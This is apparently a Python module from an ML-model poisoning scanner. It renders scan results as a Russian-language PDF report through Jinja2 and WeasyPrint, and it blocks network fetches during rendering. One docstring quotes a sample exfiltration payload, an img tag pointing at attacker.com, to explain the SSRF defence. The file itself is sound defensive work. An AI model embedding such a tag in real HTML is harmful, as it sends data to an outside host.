"""PDF-форматтер для результатов сканирования ML-моделей.

Генерирует отчёт в формате PDF по ГОСТ Р 56939-2024.
Шаблон: Jinja2 + WeasyPrint.

Обе зависимости опциональны (extras: poison-check[pdf]).
Импорт этого модуля не должен падать без jinja2/weasyprint — тогда команда
``poison-check --help`` и любые не-PDF пути будут работать в минимальной
установке. Реальные ImportError'ы поднимаются только при инстанцировании
PdfReportFormatter или вызове format()/format_html().
"""

from __future__ import annotations

import importlib.util
from pathlib import Path
from typing import Any

from poison_check.core.result import ScanResult, Severity
from poison_check.output.report_metadata import report_metadata_of

TEMPLATE_DIR = Path(__file__).parent / "templates"

# Метки severity на русском для шаблона
_SEVERITY_LABELS: dict[str, str] = {
    Severity.CRITICAL.value: "КРИТИЧЕСКИЙ",
    Severity.HIGH.value: "ВЫСОКИЙ",
    Severity.MEDIUM.value: "СРЕДНИЙ",
    Severity.LOW.value: "НИЗКИЙ",
    Severity.INFO.value: "ИНФОРМАЦИОННЫЙ",
}

_SEVERITY_ORDER: list[str] = [
    Severity.CRITICAL.value,
    Severity.HIGH.value,
    Severity.MEDIUM.value,
    Severity.LOW.value,
    Severity.INFO.value,
]


def _severity_label(value: str) -> str:
    """Возвращает русское название уровня опасности."""
    return _SEVERITY_LABELS.get(value, value.upper())


def _group_issues_by_severity(result: ScanResult) -> list[dict[str, Any]]:
    """Группирует все issues по severity в порядке убывания опасности.

    Возвращает список словарей:
    [{"severity": "critical", "label": "КРИТИЧЕСКИЙ", "issues": [...], "file_path": ...}, ...]
    """
    # Собираем все issues с привязкой к файлу
    all_issues: list[dict[str, Any]] = []
    for file_path, file_result in result.results_per_file.items():
        for issue in file_result.issues:
            all_issues.append({
                "issue": issue,
                "file_path": str(file_path),
            })

    # Группируем по severity в нужном порядке
    groups: list[dict[str, Any]] = []
    for sev_value in _SEVERITY_ORDER:
        matching = [
            item for item in all_issues
            if item["issue"].severity.value == sev_value
        ]
        if matching:
            groups.append({
                "severity": sev_value,
                "label": _severity_label(sev_value),
                "entries": matching,
            })
    return groups


def _file_hashes(result: ScanResult) -> list[dict[str, Any]]:
    """Собирает информацию о файлах с хешами для раздела отчёта.

    Хеши берутся из первого поля details issue (если доступны),
    иначе подставляется прочерк.
    """
    files_info: list[dict[str, Any]] = []
    for file_path, file_result in result.results_per_file.items():
        files_info.append({
            "path": str(file_path),
            "scanner": file_result.scanner_name,
            "issues_count": len(file_result.issues),
            "error": file_result.error,
        })
    return files_info


def _collect_compliance_tags(result: ScanResult) -> dict[str, list[str]]:
    """Собирает уникальные compliance-теги по категориям из всех issues.

    Возвращает словарь вида:
    {"owasp-ml": ["ML03", "ML10"], "fstec": ["УБИ.067"], "gost": [...]}
    """
    owasp: set[str] = set()
    fstec: set[str] = set()
    gost: set[str] = set()
    other: set[str] = set()

    for file_result in result.results_per_file.values():
        for issue in file_result.issues:
            for tag in issue.compliance_tags:
                tag_lower = tag.lower()
                if tag_lower.startswith("owasp-ml:"):
                    owasp.add(tag.split(":", 1)[1].upper())
                elif tag_lower.startswith("fstec:"):
                    fstec.add(tag.split(":", 1)[1])
                elif tag_lower.startswith("gost:"):
                    gost.add(tag.split(":", 1)[1])
                else:
                    other.add(tag)

    result_dict: dict[str, list[str]] = {}
    if owasp:
        result_dict["OWASP ML Top 10"] = sorted(owasp)
    if fstec:
        result_dict["ФСТЭК БДУ"] = sorted(fstec)
    if gost:
        result_dict["ГОСТ"] = sorted(gost)
    if other:
        result_dict["Прочие"] = sorted(other)
    return result_dict


class PdfReportFormatter:
    """Форматтер PDF-отчёта по ГОСТ Р 56939-2024.

    Генерирует профессиональный PDF на русском языке для пентестеров.
    Шаблон Jinja2 рендерится в HTML, затем WeasyPrint конвертирует в PDF.

    WeasyPrint — опциональная зависимость:
    - format_html() работает без него (отладка шаблона)
    - format() требует weasyprint; при отсутствии поднимает ImportError с понятным сообщением
    """

    TEMPLATE_DIR = TEMPLATE_DIR

    def __init__(self) -> None:
        """Инициализирует Jinja2 Environment и проверяет наличие weasyprint.

        Импорт jinja2 отложен сюда, чтобы модуль ``pdf_report`` можно было
        свободно импортировать из ``cli.py`` даже в минимальной установке
        без ``poison-check[pdf]`` — иначе ``poison-check --help`` падает
        с ``ModuleNotFoundError: No module named 'jinja2'``.
        """
        try:
            from jinja2 import (  # noqa: PLC0415
                Environment,
                FileSystemLoader,
                select_autoescape,
            )
        except ImportError as exc:
            raise ImportError(
                "Jinja2 не установлен. Для PDF-отчётов выполните: "
                "pip install 'poison-check[pdf]'  или  pip install jinja2 weasyprint"
            ) from exc

        self._env = Environment(
            loader=FileSystemLoader(str(self.TEMPLATE_DIR)),
            autoescape=select_autoescape(["html", "xml"]),
        )
        # Добавляем вспомогательные фильтры в Jinja2
        self._env.filters["severity_label"] = _severity_label

        self._weasyprint_available = (
            importlib.util.find_spec("weasyprint") is not None
        )

    def format(
        self,
        result: ScanResult,
        client_name: str = "",
        auditor_name: str = "",
    ) -> bytes:
        """Генерирует PDF-файл в байтах.

        Рендерит HTML-шаблон и конвертирует в PDF через WeasyPrint.

        :param result: Результат сканирования.
        :param client_name: Имя заказчика для титульного листа.
        :param auditor_name: Имя аудитора для листа подписи.
        :return: Байты PDF-документа.
        :raises ImportError: Если weasyprint не установлен.
        :raises RuntimeError: Если WeasyPrint не смог сгенерировать PDF.
        """
        if not self._weasyprint_available:
            raise ImportError(
                "WeasyPrint не установлен. Для генерации PDF выполните: "
                "pip install 'poison-check[pdf]'  или  pip install weasyprint"
            )

        html = self._render_html(result, client_name, auditor_name)
        return self._html_to_pdf(html)

    def format_html(
        self,
        result: ScanResult,
        client_name: str = "",
        auditor_name: str = "",
    ) -> str:
        """Генерирует только HTML — без конвертации в PDF.

        Полезно для отладки шаблона и проверки содержимого отчёта.
        Работает без установленного WeasyPrint.

        :param result: Результат сканирования.
        :param client_name: Имя заказчика для титульного листа.
        :param auditor_name: Имя аудитора для листа подписи.
        :return: HTML-строка отчёта.
        """
        return self._render_html(result, client_name, auditor_name)

    # ------------------------------------------------------------------
    # Приватные методы
    # ------------------------------------------------------------------

    def _render_html(
        self,
        result: ScanResult,
        client_name: str,
        auditor_name: str,
    ) -> str:
        """Рендерит Jinja2-шаблон в HTML-строку.

        Готовит контекст с данными для шаблона и вызывает render().

        Реквизиты шапки берутся из ``result.report_metadata`` (единая точка —
        :mod:`poison_check.output.report_metadata`), если явные аргументы не
        переданы. Так PDF получает ``--client``/``--auditor`` тем же каналом,
        что и остальные форматы, а прямой вызов из Python API с явными именами
        продолжает работать.
        """
        template = self._env.get_template("report.html.j2")

        metadata = report_metadata_of(result)
        if metadata is not None:
            client_name = client_name or metadata.client or ""
            auditor_name = auditor_name or metadata.auditor or ""

        # Подготавливаем сводку по severity
        summary = result.summary
        summary_data = {
            "critical": summary.critical,
            "high": summary.high,
            "medium": summary.medium,
            "low": summary.low,
            "info": summary.info,
            "total": (
                summary.critical
                + summary.high
                + summary.medium
                + summary.low
                + summary.info
            ),
        }

        # Собираем worst_severity label
        worst = result.worst_severity
        worst_label = _severity_label(worst.value) if worst else "—"

        context: dict[str, Any] = {
            "result": result,
            "client_name": client_name,
            "auditor_name": auditor_name,
            "summary": summary_data,
            "worst_severity_label": worst_label,
            "severity_groups": _group_issues_by_severity(result),
            "files_info": _file_hashes(result),
            "compliance_map": _collect_compliance_tags(result),
            "severity_labels": _SEVERITY_LABELS,
            "has_decompiled": _has_decompiled_code(result),
        }

        return template.render(**context)

    def _html_to_pdf(self, html: str) -> bytes:
        """Конвертирует HTML-строку в PDF-байты через WeasyPrint.

        Передаёт собственный ``url_fetcher``, блокирующий любые сетевые и
        file://-запросы. Это критично, потому что HTML-шаблон может содержать
        строки из вредоносного pickle-файла (например, ``decompiled_code``
        с встроенным ``<img src="http://attacker.com/exfil?data=...">``).
        Без офлайн-фетчера WeasyPrint бы выполнил GET-запрос к атакующему,
        что нарушает принцип «полный офлайн» и даёт
        SSRF-вектор.

        :param html: HTML-строка.
        :return: PDF-байты.
        :raises RuntimeError: При ошибке генерации PDF.
        """
        try:
            import weasyprint  # type: ignore[import-untyped]
        except ImportError as exc:
            raise ImportError(
                "WeasyPrint не установлен. Выполните: pip install weasyprint"
            ) from exc

        try:
            pdf_bytes: bytes = weasyprint.HTML(
                string=html,
                url_fetcher=_offline_url_fetcher,
            ).write_pdf()
        except Exception as exc:
            raise RuntimeError(f"Ошибка генерации PDF: {exc}") from exc

        return pdf_bytes


def _offline_url_fetcher(url: str) -> dict[str, Any]:
    """url_fetcher для WeasyPrint, блокирующий все внешние ресурсы.

    WeasyPrint вызывает url_fetcher для каждого ``<img>``, ``<link>`` и
    CSS ``url()``. Если url_fetcher не задан, библиотека делает реальный
    HTTP/file-запрос. Возвращая исключение, мы гарантируем, что PDF-генерация
    остаётся полностью офлайн — никаких запросов наружу даже на вредоносных
    входах.

    Принимаем data:-URI (они инлайн в самом документе и не требуют сети) —
    это позволяет шаблону использовать встроенные SVG/PNG в base64.
    """
    if url.startswith("data:"):
        # data:-URI обрабатывается WeasyPrint собственным парсером без внешнего
        # fetcher'а; но если он попал сюда — пропускаем как есть.
        from weasyprint import default_url_fetcher  # noqa: PLC0415

        result: dict[str, Any] = default_url_fetcher(url)
        return result

    raise OSError(
        f"Сетевые ресурсы запрещены в офлайн-режиме PDF-генерации (URL: {url!r}). "
        "Это намеренная защита от SSRF-атак через вредоносный pickle."
    )


def _has_decompiled_code(result: ScanResult) -> bool:
    """Возвращает True если хотя бы одна issue содержит декомпилированный код."""
    return any(
        issue.decompiled_code is not None
        for file_result in result.results_per_file.values()
        for issue in file_result.issues
    )
